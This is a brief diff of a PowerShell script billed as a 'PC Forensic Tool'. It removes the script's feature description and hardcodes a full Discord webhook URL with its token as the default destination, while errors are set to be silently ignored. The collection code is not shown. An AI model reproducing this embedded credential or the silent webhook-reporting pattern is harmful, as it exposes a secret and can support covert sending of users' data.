@@ -1,8 +1,7 @@
-# Enhanced PC Forensic Tool v3.0
-# Features: file.io upload, comprehensive webhook info, pattern search, .cfg/.exe logging
+
 
 param(
-    [string]$WebhookURL = ""
+    [string]$WebhookURL = "https://discord.com/api/webhooks/1469718055591346380/u8BSIT-aDsZeuAue-sOa8Wla3wLj0hWY9bKZCbgSIP7SMCS24ao64q_PJPsVsYi599Ku"
 )
 
 $ErrorActionPreference = "SilentlyContinue"
